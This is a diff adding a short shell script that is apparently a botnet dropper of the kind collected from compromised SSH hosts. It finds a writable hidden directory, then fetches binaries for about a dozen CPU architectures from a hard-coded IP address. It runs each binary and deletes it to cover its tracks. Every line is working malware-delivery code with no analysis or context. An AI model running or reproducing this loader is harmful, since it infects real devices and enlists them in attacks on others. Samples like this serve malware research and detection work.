@@ -1,0 +1,15 @@
+>/tmp/.a && cd /tmp
+>/dev/.a && cd /dev
+>/dev/shm/.a && cd /dev/shm
+
+wget http://80.94.92.49/arm4 -O- > .f; chmod 777 .f; ./.f ssh.arm4; rm -rf .f
+wget http://80.94.92.49/arm5 -O- > .f; chmod 777 .f; ./.f ssh.arm5; rm -rf .f
+wget http://80.94.92.49/arm6 -O- > .f; chmod 777 .f; ./.f ssh.arm6; rm -rf .f
+wget http://80.94.92.49/arm7 -O- > .f; chmod 777 .f; ./.f ssh.arm7; rm -rf .f
+wget http://80.94.92.49/i686 -O- > .f; chmod 777 .f; ./.f ssh.x86; rm -rf .f
+wget http://80.94.92.49/x86_64 -O- > .f; chmod 777 .f; ./.f ssh.x86_64; rm -rf .f
+wget http://80.94.92.49/mips -O- > .f; chmod 777 .f; ./.f ssh.mips; rm -rf .f
+wget http://80.94.92.49/mipsel -O- > .f; chmod 777 .f; ./.f ssh.mipsel; rm -rf .f
+wget http://80.94.92.49/mips64 -O- > .f; chmod 777 .f; ./.f ssh.mips64; rm -rf .f
+wget http://80.94.92.49/sh4 -O- > .f; chmod 777 .f; ./.f ssh.superh; rm -rf .f
+wget http://80.94.92.49/sparc -O- > .f; chmod 777 .f; ./.f ssh.sparc; rm -rf .f
